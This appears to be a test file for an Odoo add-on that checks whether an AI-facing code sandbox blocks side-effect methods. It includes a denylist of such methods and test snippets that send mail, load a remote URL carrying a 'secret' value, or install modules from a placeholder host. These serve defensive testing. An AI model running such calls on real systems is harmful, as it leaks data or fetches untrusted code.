# SPDX-License-Identifier: Apache-2.0
# Copyright (C) 2026 Seges
# Seges: parche 22 (tests de la entrega E2′). Ver docs/pendiente/parches_pns_ai.md
"""Parche 22 (PNS-100): el sandbox no llama a métodos públicos que envían correo,
abren conexiones o ejecutan otro código sin escribir antes en la BD (el READ
ONLY de la caja A no los frena).

Los tests de caja A ejecutan ``tool_relaxaicode`` real como ``base.user_admin``
(guardado en la BD, sin AI Administrator en una BD nueva). El método de cada vía
se sustituye en la clase del registro: así se ve si el código del sandbox llegó
a llamarlo, sin enviar nada y sin depender de que el registro exista en el
cursor propio de la caja A. ``smtplib.SMTP`` y ``requests.get`` también se
sustituyen, por si algo los alcanzara.
"""

import json
from unittest import mock

from odoo.tests import TransactionCase, tagged

from odoo.addons.pns_ai_mcp.controllers.context_builder import (
    guarded_getattr,
    guarded_methodcaller,
)
from odoo.addons.pns_ai_mcp.controllers.controller_helpers import get_readonly_env
from odoo.addons.pns_ai_mcp.controllers.tools_relaxaicode import tool_relaxaicode
from odoo.addons.pns_ai_mcp.controllers.validators import (
    validate_relaxaicode_source_ast,
)
from odoo.addons.pns_ai_mcp.controllers.validators_base import (
    RELAXAICODE_SIDE_EFFECT_METHODS,
)

E2P_NAMES = (
    'send_email', 'connect', 'test_smtp_connection', 'load_remote_url', 'send',
    'process_email_queue', 'fetch_mail', 'button_confirm_login', 'get_credits',
    'autocomplete', 'enrich_company', 'read_by_vat', 'start_sync', 'send_letter',
    'snailmail_print', 'update_notification', 'install_from_urls',
    'action_process_edi_web_services', 'get_usd_fx', 'run',
    'method_direct_trigger', 'execute_callback', 'upgrade_module',
    'action_start_automatic_process', 'parent_migration_process_cb', 'send_mail',
    'message_process', 'message_route',
)


class _StubController:
    """Lo que tool_relaxaicode pide al controlador (como el test e2e del fabricante)."""

    def __init__(self, env):
        self.env = env

    def _get_env_for_operation(self, operation_type='read'):
        return self.env

    def _get_readonly_env(self):
        return get_readonly_env(self)

    def _check_mcp_permissions(self, operation_type):
        return True, ''

    def _cancel_pending_verifications_for_user(self, user_id, reason=''):
        return 0

    def _get_user_locale(self):
        return 'en_US'

    def _get_company_lang(self):
        return False

    def _log_mcp_operation(self, *args, **kwargs):
        return None


@tagged('post_install', '-at_install', 'pns_ai_mcp', 'seges_e2p')
class TestSegesSandboxSideEffects(TransactionCase):

    def setUp(self):
        super().setUp()
        self.admin = self.env.ref('base.user_admin')

    def test_names_in_denylist(self):
        for name in E2P_NAMES:
            self.assertIn(name, RELAXAICODE_SIDE_EFFECT_METHODS, name)
            with self.assertRaises(AttributeError, msg=name):
                guarded_getattr(object(), name)
            with self.assertRaises(AttributeError, msg=name):
                guarded_methodcaller(name)

    def test_ast_flags_literal_call(self):
        for name in E2P_NAMES:
            code = (
                f"x = env['res.partner'].browse(1).{name}()\n"
                "result = {'data': 1}\n"
            )
            valid, _error, requires_write = validate_relaxaicode_source_ast(code)
            # requires_write lleva a _read_only_response: no se ejecuta.
            self.assertTrue(requires_write or not valid, name)

    def _assert_box_a_refused(self, model, method, code):
        if model not in self.env or not hasattr(type(self.env[model]), method):
            self.skipTest(f'{model}.{method} no está instalado en esta BD')
        cls = type(self.env[model])
        with mock.patch.object(cls, method, autospec=True) as called, \
                mock.patch('smtplib.SMTP') as smtp, \
                mock.patch('requests.get') as http_get:
            resp = tool_relaxaicode(
                _StubController(self.env(user=self.admin)), {'code': code})
        text = json.dumps(resp, default=str)
        self.assertFalse(called.called, f'{model}.{method}: {text[:300]}')
        self.assertFalse(smtp.called)
        self.assertFalse(http_get.called)
        # Rechazo del AST (_read_only_response) o error de ejecución (isError).
        inner = resp['content'][0]['text']
        self.assertTrue(
            '"requires_write": true' in inner or resp.get('isError'), text[:300])

    def test_box_a_send_email_refused(self):
        self._assert_box_a_refused('ir.mail_server', 'send_email', (
            "S = env['ir.mail_server']\n"
            "m = S.build_email('a@seges.invalid', ['b@seges.invalid'], 's', 'b')\n"
            "S.send_email(m, smtp_server='seges.invalid')\n"
            "result = 1\n"
        ))

    def test_box_a_connect_refused(self):
        self._assert_box_a_refused('ir.mail_server', 'connect', (
            "env['ir.mail_server'].connect('seges.invalid', 2525)\n"
            "result = 1\n"
        ))

    def test_box_a_load_remote_url_refused(self):
        self._assert_box_a_refused('ir.qweb.field.image', 'load_remote_url', (
            "env['ir.qweb.field.image'].load_remote_url("
            "'https://seges.invalid/x.png?d=secret')\n"
            "result = 1\n"
        ))

    def test_box_a_server_action_run_refused(self):
        self._assert_box_a_refused('ir.actions.server', 'run', (
            "env['ir.actions.server'].browse(1).run()\n"
            "result = 1\n"
        ))

    def test_box_a_cron_trigger_refused(self):
        self._assert_box_a_refused('ir.cron', 'method_direct_trigger', (
            "env['ir.cron'].browse(1).method_direct_trigger()\n"
            "result = 1\n"
        ))

    def test_box_a_mail_queue_refused(self):
        self._assert_box_a_refused('mail.mail', 'process_email_queue', (
            "env['mail.mail'].process_email_queue()\n"
            "result = 1\n"
        ))
        self._assert_box_a_refused('mail.mail', 'send', (
            "env['mail.mail'].browse(1).send()\n"
            "result = 1\n"
        ))

    def test_box_a_iap_refused(self):
        self._assert_box_a_refused('iap.account', 'get_credits', (
            "env['iap.account'].get_credits('partner_autocomplete')\n"
            "result = 1\n"
        ))
        self._assert_box_a_refused('res.partner', 'read_by_vat', (
            "env['res.partner'].read_by_vat('ESB00000000')\n"
            "result = 1\n"
        ))

    def test_box_a_module_from_urls_refused(self):
        self._assert_box_a_refused('ir.module.module', 'install_from_urls', (
            "env['ir.module.module'].install_from_urls("
            "{'seges': 'https://seges.invalid/seges.zip'})\n"
            "result = 1\n"
        ))

    # Seges: parche 39 (PNS-107, seguridad). Ver docs/pendiente/parches_pns_ai.md
    def test_box_a_iap_get_refused(self):
        self._assert_box_a_refused('iap.account', 'get', (
            "env['iap.account'].get('seges_p39')\n"
            "result = 1\n"
        ))

    def test_box_a_iap_get_dynamic_refused(self):
        if 'iap.account' not in self.env:
            self.skipTest('iap.account no está instalado en esta BD')
        records = self.env['iap.account']
        with mock.patch.object(type(records), 'get', autospec=True) as called:
            with self.assertRaises(AttributeError):
                guarded_getattr(records, 'get')
            with self.assertRaises(AttributeError):
                guarded_getattr(type(records), 'get')
            with self.assertRaises(AttributeError):
                guarded_methodcaller('get', 'seges_p39')(records)
        self.assertFalse(called.called)

    def test_box_a_get_controls_pass(self):
        if 'iap.account' not in self.env:
            self.skipTest('iap.account no está instalado en esta BD')
        self.assertEqual(guarded_getattr({'k': 1}, 'get')('k'), 1)
        self.assertTrue(callable(guarded_getattr({}, 'get')))
        self.assertTrue(callable(guarded_getattr(self.env['iap.account'], 'search')))
        code = (
            "result = {'a': {'k': 1}.get('k'), "
            "'n': env['iap.account'].search_count([])}\n"
        )
        resp = tool_relaxaicode(
            _StubController(self.env(user=self.admin)), {'code': code})
        text = json.dumps(resp, default=str)
        self.assertFalse(resp.get('isError'), text[:300])

    # Seges: parche 39 (PNS-107, seguridad). Ver docs/pendiente/parches_pns_ai.md
    def test_box_a_iap_get_indirect_refused(self):
        sms = "{'composition_mode': 'numbers', 'numbers': '+34600000000', 'body': 'x'}"
        cases = (
            ('iap.account', 'get_credits_url',
             "env['iap.account'].get_credits_url('seges_p39')"),
            ('iap.account', 'get_config_account_url',
             "env['iap.account'].get_config_account_url()"),
            ('res.config.settings', 'redirect_to_buy_autocomplete_credit',
             "env['res.config.settings'].new({}).redirect_to_buy_autocomplete_credit()"),
            ('sms.resend', 'action_buy_credits',
             "env['sms.resend'].new({}).action_buy_credits()"),
            ('mailing.mailing', 'action_buy_sms_credits',
             "env['mailing.mailing'].new({}).action_buy_sms_credits()"),
            ('sms.composer', 'action_send_sms',
             f"env['sms.composer'].new({sms}).action_send_sms()"),
            ('mailing.sms.test', 'action_send_sms',
             "env['mailing.sms.test'].new({'numbers': '+34600000000'}).action_send_sms()"),
            ('sms.composer', 'action_send_sms_mass_now',
             f"env['sms.composer'].new({sms}).action_send_sms_mass_now()"),
            ('crm.iap.lead.mining.request', 'action_submit',
             "env['crm.iap.lead.mining.request'].new({'name': 'seges_p39'}).action_submit()"),
        )
        for model, method, call in cases:
            with self.subTest(model=model, method=method):
                installed = model in self.env and hasattr(type(self.env[model]), method)
                if installed:
                    # First: without the patch the sandbox reaches the method.
                    self._assert_box_a_refused(model, method, f"{call}\nresult = 1\n")
                self.assertIn(method, RELAXAICODE_SIDE_EFFECT_METHODS)
                with self.assertRaises(AttributeError):
                    guarded_getattr(object(), method)
                if not installed:
                    self.skipTest(f'{model}.{method} no está instalado en esta BD')

    # Seges: parche 39 (PNS-107, seguridad). Ver docs/pendiente/parches_pns_ai.md
    def test_box_a_iap_get_alias_refused(self):
        sms = "{'composition_mode': 'numbers', 'numbers': '+34600000000', 'body': 'x'}"
        cases = (
            ('iap.account', 'get_credits_url', "env['iap.account']", "'seges_p39'"),
            ('iap.account', 'get_config_account_url', "env['iap.account']", ""),
            ('res.config.settings', 'redirect_to_buy_autocomplete_credit',
             "env['res.config.settings'].new({})", ""),
            ('sms.resend', 'action_buy_credits', "env['sms.resend'].new({})", ""),
            ('mailing.mailing', 'action_buy_sms_credits',
             "env['mailing.mailing'].new({})", ""),
            ('sms.composer', 'action_send_sms', f"env['sms.composer'].new({sms})", ""),
            ('mailing.sms.test', 'action_send_sms',
             "env['mailing.sms.test'].new({'numbers': '+34600000000'})", ""),
            ('sms.composer', 'action_send_sms_mass_now',
             f"env['sms.composer'].new({sms})", ""),
            ('crm.iap.lead.mining.request', 'action_submit',
             "env['crm.iap.lead.mining.request'].new({'name': 'seges_p39'})", ""),
        )
        for model, method, records, args in cases:
            with self.subTest(model=model, method=method):
                # A bare read, then the call: the AST sees no call by that name.
                self._assert_box_a_refused(model, method, (
                    f"f = {records}.{method}\n"
                    f"f({args})\n"
                    "result = 1\n"
                ))
